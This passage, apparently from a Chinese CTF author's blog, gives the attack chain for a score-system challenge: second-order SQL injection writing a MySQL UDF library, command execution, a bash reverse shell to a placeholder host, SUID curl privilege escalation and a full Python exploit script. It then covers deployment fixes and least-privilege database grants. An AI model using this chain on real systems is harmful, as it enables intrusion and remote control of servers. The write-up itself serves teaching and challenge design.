dumpfile '</span><span class="token operator">/</span>usr<span class="token operator">/</span>lib64<span class="token operator">/</span>mysql<span class="token operator">/</span>plugin<span class="token operator">/</span>exp<span class="token punctuation">.</span>so'<span class="token punctuation">;</span><span class="token comment">#</span></code></pre><h4 id="创建udf-amp-命令执行"><a href="#创建udf-amp-命令执行" class="headerlink" title="创建udf &amp; 命令执行"></a>创建udf &amp; 命令执行</h4><p>两句话完成，还是利用score页面的二次注入</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># 创建udf，这里默认会从plugin目录下找.so文件，创建一个用户自定义函数sys_eval</span><span class="token string">';CREATE FUNCTION sys_eval RETURNS STRING SONAME '</span>exp<span class="token punctuation">.</span>so<span class="token string">';## 执行命令'</span><span class="token punctuation">;</span><span class="token keyword">select</span> sys_eval<span class="token punctuation">(</span><span class="token string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#</span></code></pre><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>执行<code>echo &#39;/bin/bash -i &gt;&amp; /dev/tcp/[ip]/[port] 0&gt;&amp;1&#39;|sh</code></p><img src="/article/eruditeFlower/image-20221007121541949.png" class="" title="image-20221007121541949" loading="lazy"><h4 id="小提权"><a href="#小提权" class="headerlink" title="小提权"></a>小提权</h4><p>直接<code>cat /flag</code>没有权限，有个小提权在这里，不是很复杂，查找有suid的程序<code>find / -perm -u=s -type f 2&gt;/dev/null</code>，可以看到curl有suid权限，且我们有curl的执行权限，因此执行<code>curl file:///flag</code>即可获得flag</p><img src="/article/eruditeFlower/image-20221007122036015.png" class="" title="image-20221007122036015" loading="lazy"><p>当然，也可以在页面上一句句执行，只不过有些复杂，但总归不可能直接就知道curl有suid权限，不可能直接curl读flag的，毕竟还是有个小考点一个小流程在这的</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""-*- coding: utf-8 -*-@File: exp.py@Author: Err0r@Time: 3月 13, 2021"""</span><span class="token keyword">import</span> random<span class="token keyword">import</span> string<span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:20712"</span>CMD <span class="token operator">=</span> <span class="token string">"echo '/bin/bash -i >&amp; /dev/tcp/[ip]/[port] 0>&amp;1'|sh"</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>COOKIES <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>HEADERS <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"Origin"</span><span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">,</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"</span><span class="token punctuation">,</span>    <span class="token string">"Referer"</span><span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">,</span>    <span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'application/x-www-form-urlencoded'</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">req</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> method<span class="token operator">=</span><span class="token string">'get'</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># print(url)</span>    data <span class="token operator">=</span> kwargs<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">)</span>    params <span class="token operator">=</span> kwargs<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"params"</span><span class="token punctuation">)</span>    cookies<span class="token punctuation">.</span>update<span class="token punctuation">(</span>COOKIES<span class="token punctuation">)</span>    headers<span class="token punctuation">.</span>update<span class="token punctuation">(</span>HEADERS<span class="token punctuation">)</span>    <span class="token keyword">if</span> method <span class="token operator">==</span> <span class="token string">'get'</span><span class="token punctuation">:</span>        resp <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>            url<span class="token operator">=</span>url<span class="token punctuation">,</span>            data<span class="token operator">=</span>data<span class="token punctuation">,</span>            params<span class="token operator">=</span>params<span class="token punctuation">,</span>            headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>            cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span>            timeout<span class="token operator">=</span>timeout<span class="token punctuation">,</span>            allow_redirects<span class="token operator">=</span>allow_redirects        <span class="token punctuation">)</span>    <span class="token keyword">elif</span> method <span class="token operator">==</span> <span class="token string">'post'</span><span class="token punctuation">:</span>        resp <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>            url<span class="token operator">=</span>url<span class="token punctuation">,</span>            data<span class="token operator">=</span>data<span class="token punctuation">,</span>            params<span class="token operator">=</span>params<span class="token punctuation">,</span>            headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>            cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span>            timeout<span class="token operator">=</span>timeout<span class="token punctuation">,</span>            allow_redirects<span class="token operator">=</span>allow_redirects        <span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        session<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># close session</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Requests method error.'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> resp<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getRadmonStr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>sample<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">reg</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">:</span>    tarurl <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"/register.php"</span>    studentid <span class="token operator">=</span> getRadmonStr<span class="token punctuation">(</span><span class="token punctuation">)</span>    params <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"username"</span><span class="token punctuation">:</span> sql<span class="token punctuation">,</span>        <span class="token string">"studentid"</span><span class="token punctuation">:</span> studentid<span class="token punctuation">,</span>        <span class="token string">"submit"</span><span class="token punctuation">:</span> <span class="token string">"提交"</span>    <span class="token punctuation">&#125;</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>tarurl<span class="token punctuation">,</span> data<span class="token operator">=</span>params<span class="token punctuation">,</span> method<span class="token operator">=</span><span class="token string">"post"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> studentid<span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span> studentid<span class="token punctuation">)</span><span class="token punctuation">:</span>    tarurl <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"/login.php"</span>    params <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"username"</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span>        <span class="token string">"studentid"</span><span class="token punctuation">:</span> studentid<span class="token punctuation">,</span>        <span class="token string">"submit"</span><span class="token punctuation">:</span> <span class="token string">"提交"</span>    <span class="token punctuation">&#125;</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>tarurl<span class="token punctuation">,</span> data<span class="token operator">=</span>params<span class="token punctuation">,</span> method<span class="token operator">=</span><span class="token string">"post"</span><span class="token punctuation">)</span>    <span class="token comment"># print(res)</span>    <span class="token keyword">return</span> res<span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    tarurl <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"/logout.php"</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>tarurl<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">postAns</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    tarurl <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"/index.php"</span>    params <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"q1"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span>        <span class="token string">"q2"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span>        <span class="token string">"q3"</span><span class="token punctuation">:</span> <span class="token string">"4"</span><span class="token punctuation">,</span>        <span class="token comment"># "q6": "5"</span>        <span class="token string">"q4"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span>        <span class="token string">"q5"</span><span class="token punctuation">:</span> <span class="token string">"4"</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>tarurl<span class="token punctuation">,</span> data<span class="token operator">=</span>params<span class="token punctuation">,</span> method<span class="token operator">=</span><span class="token string">"post"</span><span class="token punctuation">)</span>    <span class="token comment"># print(res)</span><span class="token keyword">def</span> <span class="token function">posScore</span><span class="token punctuation">(</span>studentid<span class="token punctuation">)</span><span class="token punctuation">:</span>    tarurl <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"/score.php"</span>    params <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"studentid"</span><span class="token punctuation">:</span> studentid<span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>tarurl<span class="token punctuation">,</span> data<span class="token operator">=</span>params<span class="token punctuation">,</span> method<span class="token operator">=</span><span class="token string">"post"</span><span class="token punctuation">)</span>    <span class="token comment"># print(res)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    passwd <span class="token operator">=</span> getRadmonStr<span class="token punctuation">(</span><span class="token punctuation">)</span>    poc <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token comment"># 这里可以利用特性直接select获取到admin密码，或者像这样直接修改admin密码</span>        <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>getRadmonStr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">','</span><span class="token interpolation"><span class="token punctuation">&#123;</span>getRadmonStr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">','</span><span class="token interpolation"><span class="token punctuation">&#123;</span>getRadmonStr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">','</span><span class="token interpolation"><span class="token punctuation">&#123;</span>getRadmonStr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">','</span><span class="token interpolation"><span class="token punctuation">&#123;</span>getRadmonStr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">','</span><span class="token interpolation"><span class="token punctuation">&#123;</span>getRadmonStr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">');update users set studentid='</span><span class="token interpolation"><span class="token punctuation">&#123;</span>passwd<span class="token punctuation">&#125;</span></span><span class="token string">' where username='admin';\x23"</span></span><span class="token punctuation">,</span>        <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>getRadmonStr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">';select  into dumpfile '/usr/lib64/mysql/plugin/exp.so';\x23"</span></span><span class="token punctuation">,</span>        <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>getRadmonStr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">';CREATE FUNCTION sys_eval RETURNS STRING SONAME 'exp.so';\x23"</span></span><span class="token punctuation">,</span>        <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>getRadmonStr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">';select sys_eval(\"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>CMD<span class="token punctuation">&#125;</span></span><span class="token string">\");\x23"</span></span>    <span class="token punctuation">]</span>    pocStudentId <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> poc<span class="token punctuation">:</span>        pocStudentId<span class="token punctuation">.</span>append<span class="token punctuation">(</span>reg<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]Ready to get admin"</span><span class="token punctuation">)</span>    login<span class="token punctuation">(</span>poc<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> pocStudentId<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    postAns<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[*][?]set admin passwd: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>passwd<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    logout<span class="token punctuation">(</span><span class="token punctuation">)</span>    loginRes <span class="token operator">=</span> login<span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">,</span> passwd<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"something err0r"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> loginRes <span class="token keyword">and</span> <span class="token string">"错误"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> loginRes<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]login as admin success!"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        exit<span class="token punctuation">(</span><span class="token string">"[-]login as admin fail!"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]write out file"</span><span class="token punctuation">)</span>    posScore<span class="token punctuation">(</span>pocStudentId<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]create function"</span><span class="token punctuation">)</span>    posScore<span class="token punctuation">(</span>pocStudentId<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[*]exec cmd: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>CMD<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    posScore<span class="token punctuation">(</span>pocStudentId<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><h2 id="Q-amp-A"><a href="#Q-amp-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h2><h3 id="中文乱码"><a href="#中文乱码" class="headerlink" title="中文乱码"></a>中文乱码</h3><p>这个是典中典的问题了，首先数据库设置编码</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SET</span> NAMES utf8mb4<span class="token punctuation">;</span></code></pre><p>其次表设置编码</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">ENGINE</span><span class="token operator">=</span><span class="token keyword">InnoDB</span> <span class="token keyword">DEFAULT</span> <span class="token keyword">CHARSET</span><span class="token operator">=</span>utf8</code></pre><p>发现还是有乱码，是php和mysql连接时候的问题，要在每个<code>$mysqli</code>前先设置字符集：<code>set names utf8</code></p><pre class="language-PHP" data-language="PHP"><code class="language-PHP">$mysqli &#x3D; new mysqli(MYSQL_HOST, MYSQL_USER, MYSQL_PASSWORD, MYSQL_DATABASE);&#x2F;&#x2F; 每个$mysqli连接执行语句前都要先执行mysqli_query($mysqli,&quot;set names utf8&quot;);</code></pre><p>这样就解决了中文乱码的问题</p><h3 id="x3D-x3D-x3D-与-x3D-x3D-的问题"><a href="#x3D-x3D-x3D-与-x3D-x3D-的问题" class="headerlink" title="&#x3D;&#x3D;&#x3D;与&#x3D;&#x3D;的问题"></a>&#x3D;&#x3D;&#x3D;与&#x3D;&#x3D;的问题</h3><p>在<code>register.php</code>中原先有判断<code>$_POST[&#39;username&#39;]==&#39;admin&#39;</code>，因为是弱等于，导致可以重新注册一个admin账号，复现如下</p><img src="/article/eruditeFlower/image-20221005111447545.png" class="" title="image-20221005111447545" loading="lazy"><p>注册了账号，然后拿<code>admin</code>登录，非<code>admin%a0</code></p><img src="/article/eruditeFlower/image-20221005111513524.png" class="" title="image-20221005111513524" loading="lazy"><p>登录成功。原先以为是环境的问题，后来发现是数据库交互的问题</p><p>在注册的时候有这样一句话</p><p><code>$username = $mysqli-&gt;escape_string($_POST[&#39;username&#39;]);</code></p><p>$mysqli-&gt;escape_string出来的username没有被正确存进去，而是数据库直接存了一个新的admin账号</p><img src="/article/eruditeFlower/image-20221005111744267.png" class="" title="image-20221005111744267" loading="lazy"><p>我们把语句拿出来试一下</p><img src="/article/eruditeFlower/image-20221005111802999.png" class="" title="image-20221005111802999" loading="lazy"><p>可以看到php传递sql语句的时候带了%a0（这里明显看到<code>admin </code>后面是有一个空位的），但是sql处理的时候没有认，如果设置了urlencode就能看到了</p><img src="/article/eruditeFlower/image-20221005111910450.png" class="" title="image-20221005111910450" loading="lazy"><p>这里的问题可能将来也会是一个考点，一个小trick</p><p>既然是数据库的问题，那么就得更改数据的存储方式了，最后调试好想添加urlencode还是有点问题？</p><p>不管怎样首先把<code>register.php</code>判断改为强比较了</p><p><code>if ($_POST[&#39;username&#39;]===&#39;admin&#39;)</code></p><h3 id="admin登录上车的问题"><a href="#admin登录上车的问题" class="headerlink" title="admin登录上车的问题"></a>admin登录上车的问题</h3><p>因为二次注入可以修改admin密码，因为俺们是compose起的环境，平台不支持做动态靶机，比如说前一位选手改了admin密码为123，后一位随便一试结果进了……就很尴尬了。因为session是不清的，所以只要登录了admin就算通过，靶机重置也不会影响已经登录admin的选手。因此在login处添加了这一段</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token variable">$random</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"update users set studentid='<span class="token interpolation"><span class="token variable">$random</span></span>' where username='admin'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>不知道有没有选手爆破呢，概率很低当然也不是不可能，靶机重置同时也会重置admin密码，而靶机重置的密码规则是这样的</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">TRUNCATE</span> <span class="token keyword">TABLE</span> score<span class="token punctuation">.</span>users<span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> score<span class="token punctuation">.</span>users <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'admin'</span><span class="token punctuation">,</span> <span class="token string">'`head /dev/urandom | cksum | md5sum | cut -c 1-32`'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>选手并不知道，所以概率低，当然php中登录就修改admin密码只是加了一层复杂性，而且爆破会被ban的辣</p><h3 id="题目权限配给"><a href="#题目权限配给" class="headerlink" title="题目权限配给"></a>题目权限配给</h3><p>首先由于要写udf，而且是站库分离的结构，所以给予mysql的服务器插件目录写和执行权限</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> <span class="token number">777</span> /usr/lib64/mysql/plugin/</code></pre><p>最后一步要用s位的curl提权，收回用户和组的权限，给curl添加s位</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> <span class="token number">700</span> /flag <span class="token operator">&amp;&amp;</span> <span class="token function">chmod</span> +s /bin/curl</code></pre><h4 id="数据库的权限与被搅shi后的修改"><a href="#数据库的权限与被搅shi后的修改" class="headerlink" title="数据库的权限与被搅shi后的修改"></a>数据库的权限与被搅shi后的修改</h4><p>mysql新建了一个用户ctf，分别用到以下表</p><table><thead><tr><th align="center">表名</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">challengesAll</td><td align="center">所有的题目</td></tr><tr><td align="center">randChallenges</td><td align="center">用户抽取到的题目编号</td></tr><tr><td align="center">score</td><td align="center">用户做题得分</td></tr><tr><td align="center">userAnswer</td><td align="center">用户提交的答案</td></tr><tr><td align="center">users</td><td align="center">用户注册表</td></tr><tr><td align="center">ctf</td><td align="center">提示表</td></tr></tbody></table><p>看语句</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">USER</span> <span class="token string">'ctf'</span> IDENTIFIED <span class="token keyword">BY</span> <span class="token string">'123456'</span><span class="token punctuation">;</span><span class="token keyword">GRANT</span> <span class="token keyword">select</span> <span class="token keyword">ON</span> score<span class="token punctuation">.</span>challengesAll <span class="token keyword">TO</span> <span class="token string">'ctf'</span><span class="token variable">@'%'</span><span class="token punctuation">;</span><span class="token keyword">GRANT</span> <span class="token keyword">select</span><span class="token punctuation">,</span><span class="token keyword">insert</span> <span class="token keyword">ON</span> score<span class="token punctuation">.</span>randChallenges <span class="token keyword">TO</span> <span class="token string">'ctf'</span><span class="token variable">@'%'</span><span class="token punctuation">;</span><span class="token keyword">GRANT</span> <span class="token keyword">select</span><span class="token punctuation">,</span><span class="token keyword">insert</span> <span class="token keyword">ON</span> score<span class="token punctuation">.</span>score <span class="token keyword">TO</span> <span class="token string">'ctf'</span><span class="token variable">@'%'</span><span class="token punctuation">;</span><span class="token keyword">GRANT</span> <span class="token keyword">select</span><span class="token punctuation">,</span><span class="token keyword">insert</span> <span class="token keyword">ON</span> score<span class="token punctuation">.</span>userAnswer <span class="token keyword">TO</span> <span class="token string">'ctf'</span><span class="token variable">@'%'</span><span class="token punctuation">;</span><span class="token keyword">GRANT</span> <span class="token keyword">select</span><span class="token punctuation">,</span><span class="token keyword">insert</span><span class="token punctuation">,</span><span class="token keyword">update</span> <span class="token keyword">ON</span> score<span class="token punctuation">.</span>users <span class="token keyword">TO</span> <span class="token string">'ctf'</span><span class="token variable">@'%'</span><span class="token punctuation">;</span><span class="token keyword">GRANT</span> <span class="token keyword">select</span><span class="token punctuation">,</span><span class="token keyword">insert</span><span class="token punctuation">,</span><span class="token keyword">update</span> <span class="token keyword">ON</span> score<span class="token punctuation">.</span>ctf <span class="token keyword">TO</span> <span class="token string">'ctf'</span><span class="token variable">@'%'</span><span class="token punctuation">;</span><span class="token keyword">GRANT</span> <span class="token keyword">file</span><span class="token punctuation">,</span><span class="token keyword">insert</span> <span class="token keyword">ON</span> <span class="token operator">*</span><span class="token punctuation">.</span><span class="token operator">*</span> <span class="token keyword">TO</span> <span class="token string">'ctf'</span><span class="token variable">@'%'</span><span class="token punctuation">;</span></code></pre><p>后面会讲为何这样给予，最小权限原则</p><h5 id="challengesAll"><a href="#challengesAll" class="headerlink" title="challengesAll"></a>challengesAll</h5><p><code>challengesAll</code>是所有的题目，我只需要提取题目信息，在题目上线时已经确定，所以只需给予<code>select</code>权限即可</p><h5 id="randChallenges"><a href="#randChallenges" class="headerlink" title="randChallenges"></a>randChallenges</h5><p><code>randChallenges</code>是用户抽取到的题目，前面流程分析说过，用户在注册的时候会抽取题目插入到此表，因此需要<code>insert</code>权限，同时在主页用户需要做题，因此还需要<code>select</code>权限</p><h5 id="score-1"><a href="#score-1" class="headerlink" title="score"></a>score</h5><p><code>score</code>是用户的分数表，用户做完题后会插入一条记录记用户的分数，因此需要<code>select,insert</code>权限</p><h5 id="userAnswer"><a href="#userAnswer" class="headerlink" title="userAnswer"></a>userAnswer</h5><p><code>userAnswer</code>存储用户提交的答案，原因同上，也是需要<code>select,insert</code>权限</p><h5 id="users"><a href="#users" class="headerlink" title="users"></a>users</h5><p><code>users</code>是用户表，包括用户的增改查，是正常的注册系统的表权限，也就是这里可以出现修改admin密码的操作</p><h5 id="ctf"><a href="#ctf" class="headerlink" title="ctf"></a>ctf</h5><p><code>ctf</code>就是个提示表，没有交互，随意权限</p><h5 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h5><p>因为要写udf，要给予<code>file,insert</code>权限来创建和落地</p><h4 id="比赛中出现搅💩的状况"><a href="#比赛中出现搅💩的状况" class="headerlink" title="比赛中出现搅💩的状况"></a>比赛中出现搅💩的状况</h4><p>某一天晚上，突然发现题目全部被人修改了，原因就是权限给多了</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">GRANT</span> <span class="token keyword">select</span><span class="token punctuation">,</span><span class="token keyword">insert</span><span class="token punctuation">,</span><span class="token keyword">update</span> <span class="token keyword">ON</span> score<span class="token punctuation">.</span><span class="token operator">*</span> <span class="token keyword">TO</span> <span class="token string">'ctf'</span><span class="token variable">@'%'</span><span class="token punctuation">;</span></code></pre><p>图省事之前是这样给的权限，不符合最小权限原则，这次之后也是狠狠学习了一下</p><h5 id="临时措施"><a href="#临时措施" class="headerlink" title="临时措施"></a>临时措施</h5><p>当时出现了这样的情况，所以第一时间首先复原了题目，并且在群里通知选手不要修改了，因为这里对解题没有帮助，在此处也不存在非预期可以帮助解题，为了防止同学走歪路就通知了一下，但是没用，复原了还是被打了。</p><p>所以使用锁机制先限制一下，mysql有三种级别的锁定机制：表级锁定，行级锁定和页级锁定，首先锁定表，防止被进一步破坏</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">LOCK</span> <span class="token keyword">TABLES</span> challengesAll<span class="token punctuation">;</span></code></pre><p>然后开始检索权限，按照最小权限原则从新分配权限，最后下线题目，重新部署</p><h3 id="题目被爆破"><a href="#题目被爆破" class="headerlink" title="题目被爆破"></a>题目被爆破</h3><p>当时在解决搅shi的问题，然后发现多次警告后仍然有同学在爆破用户名和密码，直接手动封禁</p><p>从docker内部的话需要高级权限<code>--privileged</code>，但是这样会有安全性问题（著名的docker宿主机提权），于是直接在部署服务器上封禁，原先的命令是这样的</p><pre class="language-bash" data-language="bash"><code class="language-bash">iptables <span class="token parameter variable">-I</span> INPUT <span class="token parameter variable">-s</span> <span class="token punctuation">[</span>ip<span class="token punctuation">]</span> <span class="token parameter variable">-j</span> DROP <span class="token parameter variable">-dport</span> <span class="token punctuation">[</span>port<span class="token punctuation">]</span></code></pre><p>但是发现好像没生效，尝试了一下，需要配给docker用户，于是直接封禁</p><pre class="language-bash" data-language="bash"><code class="language-bash">iptables <span class="token parameter variable">-I</span> DOCKER <span class="token parameter variable">-s</span> <span class="token punctuation">[</span>ip<span class="token punctuation">]</span> <span class="token parameter variable">-j</span> DROP</code></pre><p>直接封了</p><h3 id="题目重置"><a href="#题目重置" class="headerlink" title="题目重置"></a>题目重置</h3><p>环境需要重置，一是更新admin密码，二是清空用户数据和udf，比赛时间较长，要是一直不清会有大量数据</p><p>未完待续…</p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>记一次教师机环境的渗透</title>
      <link href="article/penetrationtest/"/>
      <url>article/penetrationtest/</url>
      
